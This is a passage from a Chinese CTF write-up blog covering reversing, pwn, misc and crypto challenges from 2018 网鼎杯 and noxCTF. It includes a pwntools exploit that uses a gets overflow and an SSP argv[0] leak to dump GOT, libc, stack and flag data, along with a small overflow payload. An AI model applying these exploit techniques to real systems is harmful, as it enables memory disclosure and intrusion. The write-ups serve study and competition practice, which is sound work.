的0.1在内存中存储是什么样子的。通过写一个小的 c 程序得到结果： 12345678#include &lt;stdio.h&gt;int main() &#123; double x = 0.1; long long n = *(long long*)&amp;x; printf(\"%llX\", n); return 0;&#125; 输出结果为0x3FB999999999999A，也就是-1的值。exp 如下： 12345678from pwn import *p = process('./task1')v7 = 0x7FFFFFFFFFFFFFFFv8 = 0x3FB999999999999Aoffset = 0x28payload = (p64(v7) + p64(v8)).rjust(offset, '\\0')p.sendline(payload)p.interactive() RERERE此处记录lilac 的 writeup 通过搜索字符串找到程序校验位置，分析虚表中的函数，发现这又是一个虚拟机，因此只需要按照套路将每一个虚拟机的指令分析清楚，最终分析得到的虚表是这样的： 123456789101112131415161718192021222324252627282930.rdata:004031CC ; const RE::`vftable&apos;.rdata:004031CC ??_7RE@@6B@ dd offset assign_hi ; DATA XREF: sub_4016A0+46↑o.rdata:004031D0 dd offset get_par_hi.rdata:004031D4 dd offset inc_ip.rdata:004031D8 dd offset get_par_lo.rdata:004031DC dd offset dec_assign_hi.rdata:004031E0 dd offset add_to_hi.rdata:004031E4 dd offset subs_to_hi.rdata:004031E8 dd offset inc_assign_hi.rdata:004031EC dd offset xor_to_hi.rdata:004031F0 dd offset and_to_hi.rdata:004031F4 dd offset mul_to_hi.rdata:004031F8 dd offset mod_to_hi.rdata:004031FC dd offset push_hi.rdata:00403200 dd offset assign_lo_to_hi.rdata:00403204 dd offset load_to_hi.rdata:00403208 dd offset push.rdata:0040320C dd offset pop.rdata:00403210 dd offset store.rdata:00403214 dd offset j_flag_neg1.rdata:00403218 dd offset j_flag_1.rdata:0040321C dd offset j_not_flag.rdata:00403220 dd offset jmp_bck_cnt.rdata:00403224 dd offset cmp_hi_to_lo.rdata:00403228 dd offset inc_mem_ptr.rdata:0040322C dd offset dec_mem_ptr.rdata:00403230 dd offset xor_block.rdata:00403234 dd offset init_regs.rdata:00403238 dd offset get_res.rdata:0040323C dd offset execute_vm 其中名字中hi表示目标寄存器编号，lo表示源寄存器编号，execute_vm是执行虚拟机代码的函数，执行程序中硬编码的一段虚拟机指令。在 ida 中新建一个结构，将各个偏移的名字填上虚表函数名，就可以在execute_vm中看到opcode所对应的具体函数是什么了。通过分析这些函数的操作也很容易确定虚拟机的结构： 123456789101100000000 Vm00000000 vtable dd ?00000004 reg0 dd ?00000008 reg1 dd ?0000000C reg2 dd ?00000010 cnt dd ?00000014 flag dd ?00000018 maybe_mem dd ?0000001C field_1C dd ?00000020 stack dd ?00000024 ip_ptr dd ? 于是可以写 python 脚本将 opcode 还原成易读的伪汇编语言的形式： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253code = [79, 0, 0, 0, 47, 85, 5, 84, 48, 70, 0, 71, 34, 72, 2, 75, 51, 73, 79, 0, 0, 0, 70, 84, 16, 72, 1, 77, 39, 79, 0, 0, 0, 48, 84, 16, 72, 1, 68, 22, 79, 0, 0, 0, 57, 84, 16, 72, 1, 68, 11, 79, 0, 0, 0, 65, 84, 1, 72, 1, 68, 6, 71, 0, 72, 0, 75, 5, 71, 0, 80, 0, 67, 85, 64, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 51, 180, 136, 172, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 74, 11, 148, 63, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 124, 92, 220, 236, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 57, 41, 117, 27, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 30, 242, 107, 45, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 131, 141, 181, 46, 84, 32, 72, 18, 71, 0, 75, 2, 80, 0, 67]opcodes = &#123; 67: (\"return result\", 1), 68: (\"j_flag_neg1\", 2), 69: (\"mod_to_hi\", 2), 70: (\"load_to_hi\", 2), 71: (\"xor_to_hi\", 2), 72: (\"cmp_hi_to_lo\", 2), 73: (\"inc_mem_ptr\", 1), 74: (\"and_to_hi\", 2), 75: (\"j_not_flag\", 2), 76: (\"xor_block\", 16), 77: (\"j_flag_1\", 2), 78: (\"dec_assign_hi\", 2), 79: (\"push\", 5), 80: (\"inc_assign_hi\", 2), 81: (\"assign_lo_to_hi\", 2), 82: (\"push hi\", 2), 83: (\"add_to_hi\", 2), 84: (\"pop hi\", 2), 85: (\"jmp_bck_cnt\", 2), 86: (\"dec_mem_ptr\", 1), 87: (\"store hi\", 2), 88: (\"mul_to_hi\", 2), 89: (\"subs_to_hi\", 2)&#125;pc = 0while pc != len(code): opcode = code[pc] name = opcodes[opcode][0] length = opcodes[opcode][1] print \"%03x\\t\" % pc, print name, if length == 1: print pc += 1 elif length == 2: if 'hi' in name: print code[pc+1] &gt;&gt; 4, code[pc+1] &amp; 0xf else: print hex(code[pc+1]) pc += 2 elif length == 5: num = (code[pc+1] &lt;&lt; 24) | (code[pc+2] &lt;&lt; 16) | (code[pc+3] &lt;&lt; 8) | (code[pc+4] &lt;&lt; 0) print hex(num) pc += 5 elif length == 16: print for i in range(15): code[i + pc + 1] ^= 0x66 pc += 16 运行得到如下输出（输出中注释是分析过程）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200000 push 0x2f005 jmp_bck_cnt 0x5007 pop hi 3 0009 load_to_hi 0 000b xor_to_hi 2 200d cmp_hi_to_lo 0 200f j_not_flag 0x33 =&gt; 0x44011 inc_mem_ptr012 push 0x46017 pop hi 1 0019 cmp_hi_to_lo 0 101b j_flag_1 0x27 =&gt; 0x4401d push 0x30022 pop hi 1 0024 cmp_hi_to_lo 0 1026 j_flag_neg1 0x16 =&gt; 0x3e028 push 0x3902d pop hi 1 002f cmp_hi_to_lo 0 1031 j_flag_neg1 0xb =&gt; 0x3e033 push 0x41038 pop hi 0 103a cmp_hi_to_lo 0 103c j_flag_neg1 0x6 =&gt; 0x4403e xor_to_hi 0 0040 cmp_hi_to_lo 0 0042 j_not_flag 0x5 =&gt; 0x49fail:044 xor_to_hi 0 0046 inc_assign_hi 0 0048 return result049 jmp_bck_cnt 0x40(check hex digits)04b push 0x7050 pop hi 3 0 // cnt = 0x7052 xor_to_hi 1 1 // reg[1] = 0back:054 dec_mem_ptr055 load_to_hi 0 0 // reg[0] = c057 push 0x3005c pop hi 2 0 // reg[2] = 0x3005e subs_to_hi 0 2 // c-=0x30060 push 0xa065 pop hi 2 0 // reg[2] = 10067 cmp_hi_to_lo 0 2069 j_flag_neg1 0x9 // c &lt; 10 =&gt; less_than_1006b push 0x7070 pop hi 2 0 // reg[2] = 7072 subs_to_hi 0 2 // c-=7less_than_10:074 push 0x10079 pop hi 2 007b mul_to_hi 1 2 i &lt;&lt; 407d add_to_hi 1 0 i += c07f jmp_bck_cnt 0x2b =&gt; back081 push 0x33b488ac086 pop hi 2 0088 cmp_hi_to_lo 1 208a xor_to_hi 0 008c j_not_flag 0x308e inc_assign_hi 0 0090 return result(后七个字符为 &quot;33b488ac&quot;[::-1])091 push 0x7096 pop hi 3 0098 xor_to_hi 1 109a dec_mem_ptr09b load_to_hi 0 009d push 0x300a2 pop hi 2 00a4 subs_to_hi 0 20a6 push 0xa0ab pop hi 2 00ad cmp_hi_to_lo 0 20af j_flag_neg1 0x90b1 push 0x70b6 pop hi 2 00b8 subs_to_hi 0 20ba push 0x100bf pop hi 2 00c1 mul_to_hi 1 20c3 add_to_hi 1 00c5 jmp_bck_cnt 0x2b0c7 push 0x4a0b943f0cc pop hi 2 00ce cmp_hi_to_lo 1 20d0 xor_to_hi 0 00d2 j_not_flag 0x30d4 inc_assign_hi 0 00d6 return result0d7 push 0x70dc pop hi 3 00de xor_to_hi 1 10e0 dec_mem_ptr0e1 load_to_hi 0 00e3 push 0x300e8 pop hi 2 00ea subs_to_hi 0 20ec push 0xa0f1 pop hi 2 00f3 cmp_hi_to_lo 0 20f5 j_flag_neg1 0x90f7 push 0x70fc pop hi 2 00fe subs_to_hi 0 2100 push 0x10105 pop hi 2 0107 mul_to_hi 1 2109 add_to_hi 1 010b jmp_bck_cnt 0x2b10d push 0x7c5cdcec112 pop hi 2 0114 cmp_hi_to_lo 1 2116 xor_to_hi 0 0118 j_not_flag 0x311a inc_assign_hi 0 011c return result11d push 0x7122 pop hi 3 0124 xor_to_hi 1 1126 dec_mem_ptr127 load_to_hi 0 0129 push 0x3012e pop hi 2 0130 subs_to_hi 0 2132 push 0xa137 pop hi 2 0139 cmp_hi_to_lo 0 213b j_flag_neg1 0x913d push 0x7142 pop hi 2 0144 subs_to_hi 0 2146 push 0x1014b pop hi 2 014d mul_to_hi 1 214f add_to_hi 1 0151 jmp_bck_cnt 0x2b153 push 0x3929751b158 pop hi 2 015a cmp_hi_to_lo 1 215c xor_to_hi 0 015e j_not_flag 0x3160 inc_assign_hi 0 0162 return result163 push 0x7168 pop hi 3 016a xor_to_hi 1 116c dec_mem_ptr16d load_to_hi 0 016f push 0x30174 pop hi 2 0176 subs_to_hi 0 2178 push 0xa17d pop hi 2 017f cmp_hi_to_lo 0 2181 j_flag_neg1 0x9183 push 0x7188 pop hi 2 018a subs_to_hi 0 218c push 0x10191 pop hi 2 0193 mul_to_hi 1 2195 add_to_hi 1 0197 jmp_bck_cnt 0x2b199 push 0x1ef26b2d19e pop hi 2 01a0 cmp_hi_to_lo 1 21a2 xor_to_hi 0 01a4 j_not_flag 0x31a6 inc_assign_hi 0 01a8 return result1a9 push 0x71ae pop hi 3 01b0 xor_to_hi 1 11b2 dec_mem_ptr1b3 load_to_hi 0 01b5 push 0x301ba pop hi 2 01bc subs_to_hi 0 21be push 0xa1c3 pop hi 2 01c5 cmp_hi_to_lo 0 21c7 j_flag_neg1 0x91c9 push 0x71ce pop hi 2 01d0 subs_to_hi 0 21d2 push 0x101d7 pop hi 2 01d9 mul_to_hi 1 21db add_to_hi 1 01dd jmp_bck_cnt 0x2b1df push 0x838db52e1e4 pop hi 2 01e6 cmp_hi_to_lo 1 21e8 xor_to_hi 0 01ea j_not_flag 0x21ec inc_assign_hi 0 01ee return result 分析到 090 观察到下面都是类似的代码结构，之后直接还原 flag 就可以了，只需要把比较的十六进制字符串按端序从后往前拼接起来得到 flag。 参考网站https://laucyun.com/3411bc6f400207178b85defa04474b4a.htmlhttps://spaces.ac.cn/archives/1907https://math.stackexchange.com/questions/1791562/converting-0-1-to-binary-64-bit-doublehttps://xz.aliyun.com/t/2897https://blog.csdn.net/qq_33438733/article/details/83044151","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"2018-网鼎杯","slug":"2018-网鼎杯","date":"2018-09-12T13:00:45.000Z","updated":"2019-11-24T10:37:51.870Z","comments":true,"path":"2018/09/12/2018-网鼎杯/","link":"","permalink":"blog.b3ale.cn/2018/09/12/2018-网鼎杯/","excerpt":"现阶段主要一直在做逆向，看了好几道逆向的 wp 复现一下。","text":"现阶段主要一直在做逆向，看了好几道逆向的 wp 复现一下。 REbeijing简单的异或，直接取原来的数据： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;unsigned char pair[28] = &#123; 0x61, 0x4C, 0x67, 0x59, 0x69, 0x29, 0x6E, 0x42, 0x62, 0x0D, 0x65, 0x71, 0x66, 0x34, 0x6A, 0xC6, 0x6D, 0x8A, 0x6C, 0x7F, 0x7B, 0xAE, 0x7A, 0x92, 0x7D, 0xEC, 0x5F, 0x57&#125;;unsigned int choice[22] = &#123; 0x6, 0x9, 0x0, 0x1, 0xA, 0x0, 0x8, 0x0, 0xB, 0x2, 0x3, 0x1, 0xD, 0x4, 0x5, 0x2, 0x7, 0x2, 0x3, 0x1, 0xC&#125;;int main() &#123; char tmp = 0; for(int i = 0; i &lt; 22; i++) &#123; switch(choice[i]) &#123; case 0: tmp = pair[2 * choice[i]]; break; case 1: tmp = pair[2 * choice[i]]; break; case 2: tmp = pair[2 * choice[i]]; break; case 3: tmp = pair[2 * choice[i]]; break; case 4: tmp = pair[2 * choice[i]]; break; case 5: tmp = pair[2 * choice[i]]; break; case 6: tmp = pair[2 * choice[i]]; break; case 7: tmp = pair[2 * choice[i]]; break; case 8: tmp = pair[2 * choice[i]]; break; case 9: tmp = pair[2 * choice[i]]; break; case 10: tmp = pair[2 * choice[i]]; break; case 11: tmp = pair[2 * choice[i]]; break; case 12: tmp = pair[2 * choice[i]]; break; case 13: tmp = pair[2 * choice[i]]; break; default: tmp = 0; break; &#125; printf(\"%c\", tmp); fflush(stdout); &#125; return 0;&#125; advanced非预期解，对加密了的字符串尝试异或就找到了规律： 12345678enc = 'K@LKVHr[DXEsLsYI@\\\\AMYIr\\\\EIZQ'flag = ''for i in range(len(enc)): if i &amp; 1: flag += chr(ord(enc[i]) ^ 0x2C) else: flag += chr(ord(enc[i]) ^ 0x2D)print flag blend和之前的一道题基本一样。 通过 gdb 远程连接 qemu 进行动态调试，或者在 ida 中静态分析。程序逻辑先是判断字符串长度是否大于 19： 然后在循环中逐个比较： 在循环中，主要是pshufd指令的操作： 123456780xffffffffffffff00 0xffffffffffffff000xffffffffffff00ff 0xffffffffffff00ff0xffffffffff00ffff 0xffffffffff00ffff0xffffffff00ffffff 0xffffffff00ffffff0xffffff00ffffffff 0xffffff00ffffffff0xffff00ffffffffff 0xffff00ffffffffff0xff00ffffffffffff 0xff00ffffffffffff0x00ffffffffffffff 0x00ffffffffffffff 然后与内存中的数据相与，再通过psadbw指令进行绝对差求和。还有对高低位的一个位置交换： 123seg000:009F mov di, ds:1268hseg000:00A3 shl edi, 10hseg000:00A7 mov di, ds:1270h 最后用 z3 约束求解： 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env pythonfrom z3 import *def z3_abs(x): return If(x &gt;= 0, x, -x)def psadbw(xmm0, xmm1): a = Sum([z3_abs(b1 - b2) for b1, b2 in zip(xmm0[:8], xmm1[:8])]) b = Sum([z3_abs(b1 - b2) for b1, b2 in zip(xmm0[8:], xmm1[8:])]) return a + b * 0x10000s = Solver()ZERO = IntVal(0)xmm5 = '220f02c883fbe083c0200f10cd0013b8'.decode('hex')xmm5 = [ord(c) for c in xmm5]xmm5s = [xmm5]xmm0 = [Int('x%d' % i) for i in range(16)]for c in xmm0: s.add(c &gt;= 32, c &lt;= 126)check = [0x03110304, 0x02d902cd, 0x02d402db, 0x02c402e2, 0x02ce02e2, 0x02d802ed, 0x02dc02e8, 0x02dd02f6]xmm5s += map(lambda e: [0, 0, 0, 0, 0, 0, (e &gt;&gt; 8) &amp; 0xFF, e &amp; 0xFF, 0, 0, 0, 0, 0, 0, e &gt;&gt; 24, (e &gt;&gt; 16) &amp; 0xFF], check)print xmm5sfor i in range(8): xmm5 = xmm5s[i] xmm2 = list(xmm0) xmm2[7 - i] = ZERO xmm2[15 - i] = ZERO res = psadbw(xmm5, xmm2) s.add(res == check[i])if s.check() == sat: print s.model() flag = ''.join(chr(eval(str(s.model()[c]))) for c in xmm0) # pshufd xmm0, xmm0, 1Eh flag = 'flag' + flag[:4][::-1] + flag[4:8][::-1] + flag[12:][::-1] + flag[8:12][::-1] print flag # flagmbr_is_funny__eh PWNGUESS漏洞点很明显，gets处可以溢出： 123456789101112131415161718192021222324252627282930313233343536373839404142434445__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch] int v5; // [rsp+1Ch] [rbp-84h] __int64 v6; // [rsp+20h] [rbp-80h] __int64 v7; // [rsp+28h] [rbp-78h] char buf; // [rsp+30h] [rbp-70h] char s2; // [rsp+60h] [rbp-40h] unsigned __int64 v10; // [rsp+98h] [rbp-8h] v10 = __readfsqword(0x28u); v7 = 3LL; LODWORD(stat_loc.__uptr) = 0; v6 = 0LL; sub_4009A6(); HIDWORD(stat_loc.__iptr) = open(\"./flag.txt\", 0, a2); if ( HIDWORD(stat_loc.__iptr) == -1 ) &#123; perror(\"./flag.txt\"); _exit(-1); &#125; read(SHIDWORD(stat_loc.__iptr), &amp;buf, 0x30uLL); close(SHIDWORD(stat_loc.__iptr)); puts(\"This is GUESS FLAG CHALLENGE!\"); while ( 1 ) &#123; if ( v6 &gt;= v7 ) &#123; puts(\"you have no sense... bye :-) \"); return 0LL; &#125; v5 = sub_400A11(); // fork() if ( !v5 ) break; ++v6; wait((__WAIT_STATUS)&amp;stat_loc); &#125; puts(\"Please type your guessing flag\"); gets((__int64)&amp;s2); if ( !strcmp(&amp;buf, &amp;s2) ) puts(\"You must have great six sense!!!! :-o \"); else puts(\"You should take more effort to get six sence, and one more challenge!!\"); return 0LL;&#125; checksec 后发现开了Canary。Canary检查失败的时候调用__stack_chk_fail： 12345void__attribute__ ((noreturn))__stack_chk_fail (void) &#123; __fortify_fail (\"stack smashing detected\");&#125; 其中的__fortify_fail打印出了__libc_argv[0]所指向字符串： 123456789void__attribute__ ((noreturn))__fortify_fail (msg) const char *msg; &#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"&lt;unknown&gt;\")&#125;libc_hidden_def (__fortify_fail) 可以通过覆盖__libc_argv[0]实现读取想要的数据，也就是SSP（Stack Smashing Protector） Leak。调试过程中有一个比较容易获取指针的方法： 12assassinq&gt;&gt; p &amp;__libc_argv[0]$1 = (char **) 0x7fffffffe4c8 然后因为 libc 导出了一个符号environ，其值和main函数的第三个参数envp一样。这样的话，只要泄漏出 libc 的基址就可以得到栈上的地址。 三次进程正好分为： 利用 got 表得到 libc 地址 利用 libc 的 environ 得到 stack 地址 计算 flag 地址并输出 exp： 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'local = 1if local: p = process('./guess')else: p = remote('106.75.90.160', 9999)elf = ELF('./guess')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')buf = 0x7fffffffe4d0argv_0 = 0x7fffffffe5f8offset1 = argv_0 - getsoffset2 = 0x7ffd12119a88 - 0x7ffd12119920gets_got = elf.got['gets'] # 0x602058# got ==&gt; libcp.recvuntil('flag\\n')payload = 'A' * offset1 + p64(gets_got)p.sendline(payload)p.recvuntil('***: ')gets_got = u64(sh.recv(6).ljust(8, '\\x00'))print hex(gets_got)libc_base = gets_got - libc.symbols['gets']libc.address = libc_baseprint hex(libc_base)# libc ==&gt; environ ==&gt; stackp.recvuntil('flag\\n')payload = 'A' * offset1 + p64(libc.symbols['environ'])p.sendline(payload)p.recvuntil('***: ')stack = u64(p.recv(6).ljust(8, '\\x00'))print hex(stack)# flagp.recvuntil('flag\\n')payload = 'B' * offset1 + p64(stack - offset2)p.sendline(payload)p.interactive() MISCminified取出 Alpha0 和 Green0 通道的图片后异或得到 flag。 双色块先上 binwalk 得到图片，key 为 ctfer2333。 尝试把 gif 每一个帧拼凑成图片，发现无法得到一个正常的二维码。 再猜测将紫色与绿色色块分别表示 \b1 和 0，先提取出每张图片： 123456789101112131415161718import osfrom PIL import Imagedef main(gif_file): png_dir = 'frame/' img = Image.open(gif_file) try: while True: current = img.tell() print current img.save(png_dir + str(current + 1) + '.png') img.seek(current + 1) except BaseException as e: print eif __name__ == '__main__': gif_file = 'out.gif' main(gif_file) 再读取图片内容，转换成 0 和 1，最后每 8 位转为一个 ascii 字符： 123456789101112131415161718192021222324252627import osfrom PIL import Imagedef main(): png_dir = 'frame/' ret = '' for i in range(0, 24): line = '' for j in range(0, 24): file_name = 'frame/' + str(i * 24 + j + 1) + '.png' x = j * 10 + 5 y = i * 10 + 5 img = Image.open(file_name) img = img.convert('RGB') img_array = img.load() r, g, b = p = img_array[x, y] if g == 255: line += '0' if r == 255 and b == 255: line += '1' if len(line) == 8: ret += chr(int(line, 2)) line = '' print retif __name__ == '__main__': main() 去掉得到的字符串后面的 hhhhh，因为明显不像加密后的内容，\b 尝试 base64 无果后，用 DES 解密，密钥即为一开始得到的 ctfer2333，得到 flag。 welcome解压后用 cat 把所有的文件合并，得到一个 zip 文件，爆破密码得到 flag。 CRYPTOshanghai维吉尼亚解密，在线解密，直接得到 flag。 同时还得到密钥是 icqvigenere。 apl之前 PladCTF 有一道类似的题目，在 xman 的时候也分析过。 apl 最大的特点是从右往左计算。⍵代表右侧的变量，α代表左侧的变量。 一开始给了一长串 base64 字符串，解密后得到 apl： 1&#123;⍵(~⍵)/(&apos;No_Please_continue&apos;)(&apos;Yes,This_is_flag&apos;)&#125;(∊(41(41)0+140)(⎕UCS(&apos;µě»ÕĀ$#Ğ$èáËĞĞĝ`âÞĠ#&quot;!Ġ&quot;KE(©$#Ğ$Q&lt;k&apos;))146)&#123;+/⍺≠33+2⊥(1(5)×8)⍴∊&#123;a≠8↑(1,a←(8⍴2)⊤⍵)&#125;¨2⊥8(+/⍴⍳(7*2)-⌊9.1⌊⍴&apos;FlagIsWhat&apos;)⍴10⊖⊖⌽(∊4(⍴⍴88888)+16)⍴(1+(|¯8)⍴1)⊤⎕UCS(⍵)&#125;&apos;YourFlagIsWhat?&apos; 先分成几个部分： {⍵(~⍵)/(&#39;No_Please_continue&#39;)(&#39;Yes,This_is_flag&#39;)} ==&gt; 输出判断结果 (∊(41(41)0+140)(⎕UCS(&#39;µě»ÕĀ$#Ğ$èáËĞĞĝ`âÞĠ#&quot;!Ġ&quot;KE(©$#Ğ$Q&lt;k&#39;))146) ==&gt; 181 181 140 181 283 187 213 256 36 35 286 36 232 225 203 286 286 285 96 226 222 288 92 120 57 100 35 34 33 288 34 75 69 40 169 36 35 286 36 81 60 107 146 {+/⍺≠33+2⊥(1(5)×8)⍴∊{a≠8↑(1,a←(8⍴2)⊤⍵)}¨2⊥8(+/⍴⍳(7*2)-⌊9.1⌊⍴&#39;FlagIsWhat&#39;)⍴10⊖⊖⌽(∊4(⍴⍴88888)+16)⍴(1+(|¯8)⍴1)⊤⎕UCS(⍵)} ==&gt; 主要加密过程 再通过主要加密过程分析，根据 apl 的特性应该倒着来： (1+(|¯8)⍴1)⊤⎕UCS(⍵) ==&gt; 将 ascii 转换成二进制 (∊4(⍴⍴88888)+16) ==&gt; 20 16，即将右侧的矩阵填充为 20*16 10⊖⊖⌽ ==&gt; 将矩阵的行倒序，列向上 \b 位移 10 8(⍴⍳(7*2)-⌊9.1⌊⍴&#39;FlagIsWhat&#39;) ==&gt; 8 40，即将右侧的矩阵填充为 8*40 2⊥ ==&gt; 将二进制转换成 ascii {a≠8↑(1,a←(8⍴2)⊤⍵)} ==&gt; x ^ (x &gt;&gt; 1) +/⍺≠33+2⊥(1(5)×8) ==&gt; ¨按列读取矩阵，然后经过上一步的移位异或，转为 ascii 码并加上 33 接下来按步骤逆向即可： 1⎕UCS(2⊥(8 40)⍴⌽⊖10⊖(20 16)⍴(8⍴2)⊤(106 202 104 193 192 206 201 100 192 194 204 194 75 200 206 106 193 75 192 201 201 194 75 206 196 98 206 75 196 192 201 108 198 204 100 193 46 40 35 38)) 参考网站https://www.jianshu.com/p/005bda1f8535https://www.anquanke.com/post/id/158386#h3-5https://xz.aliyun.com/t/2665https://mp.weixin.qq.com/s/d4KB9b83D5iiQAfNieqh3whttps://ihomura.cn/2018/08/23/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%95%99%E8%82%B2%E7%BB%84/https://github.com/TechSecCTF/writeups/tree/master/CSAWQuals2017/realismhttps://www.jianshu.com/p/005bda1f8535https://blog.csdn.net/whklhhhh/article/details/81950438https://xz.aliyun.com/t/2614https://blog.csdn.net/whklhhhh/article/details/82217266https://xz.aliyun.com/t/2666","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"2018-noxCTF","slug":"2018-noxCTF","date":"2018-09-10T10:01:51.000Z","updated":"2019-08-26T01:15:02.454Z","comments":true,"path":"2018/09/10/2018-noxCTF/","link":"","permalink":"blog.b3ale.cn/2018/09/10/2018-noxCTF/","excerpt":"记录几道简单题。","text":"记录几道简单题。 RE-GuessTheString把每个 check 分辨出来，然后逐一分析，先判断字符串长度： 1234_BOOL8 __fastcall check1(const char *a1)&#123; return strlen(a1) == 11;&#125; 判断每个字符是否都大于 32： 12345678910__int64 __fastcall check2(_BYTE *s)&#123; char *v2; // [rsp+0h] [rbp-18h] _BOOL4 i; // [rsp+14h] [rbp-4h] v2 = s; for ( i = 1; i &amp;&amp; *v2; i = bigger_than_32(*v2++) ) ; return (unsigned int)i;&#125; 第一个字符不等于 66 且第一个字符与第二个字符的乘积为 3478，可分解质因数求解： 123456789101112131415__int64 __fastcall check3(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( *s == 66 ) &#123; v2 = 0; &#125; else if ( *s * s[1] != 3478 ) &#123; v2 = 0; &#125; return v2;&#125; 前三个数连续异或得到 49: 123456789__int64 __fastcall check4(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( ((unsigned __int8)(s[1] ^ *s) ^ (unsigned __int8)s[2]) != 49 ) v2 = 0; return v2;&#125; 第四个数大于第三个数，但是两者平方和相等，显然是溢出，在计算中通过模 256（即 0xFF）来实现： 12345678910111213141516__int64 __fastcall check5(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( s[3] &gt; s[2] ) &#123; if ( s[2] * s[2] != s[3] * s[3] ) v2 = 0; &#125; else &#123; v2 = 0; &#125; return v2;&#125; 接下来还出现了一个检查素数的函数： 1234567891011121314151617181920212223__int64 __fastcall check_prime(char c)&#123; signed int i; // [rsp+Ch] [rbp-8h] unsigned int v3; // [rsp+10h] [rbp-4h] v3 = 1; if ( (unsigned __int8)c &gt; 1u ) &#123; if ( (unsigned __int8)c &gt; 2u ) &#123; for ( i = 2; v3 &amp;&amp; i &lt; (unsigned __int8)c; ++i ) &#123; if ( !((unsigned __int8)c % i) ) v3 = 0; &#125; &#125; &#125; else &#123; v3 = 0; &#125; return v3;&#125; 第五和第六个字符相互异或等于 126： 1234567891011121314151617181920212223__int64 __fastcall check6(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( (unsigned int)check_prime(s[4]) ) &#123; if ( (unsigned int)check_prime(s[5]) ) &#123; if ( ((unsigned __int8)s[4] ^ (unsigned __int8)s[5]) != 126 ) v2 = 0; &#125; else &#123; v2 = 0; &#125; &#125; else &#123; v2 = 0; &#125; return v2;&#125; 第七个字符的 1/2 是素数，且第七个字符等于第六个字符减去 42 的两倍： 12345678910111213141516__int64 __fastcall check7(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( (unsigned int)check_prime(s[6] / 2) ) &#123; if ( s[6] != 2 * (s[5] - 42) ) v2 = 0; &#125; else &#123; v2 = 0; &#125; return v2;&#125; 第八个数字在(47, 57]范围内，右移两位后乘四等于本身： 1234567891011__int64 __fastcall check8(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( s[7] &lt;= 47 || s[7] &gt; 57 ) v2 = 0; if ( 4 * (char)(s[7] &gt;&gt; 2) != s[7] ) v2 = 0; return v2;&#125; 传入 \b 数字与第八个字符异或得到第九个字符： 1234_BOOL8 __usercall check9@&lt;rax&gt;(unsigned __int8 a1@&lt;efl&gt;, __int64 a2, char *s)&#123; return s[8] == (a1 ^ (unsigned __int8)s[7]);&#125; 两倍关系： 123456789__int64 __fastcall check10(char *a1)&#123; unsigned int v2; // 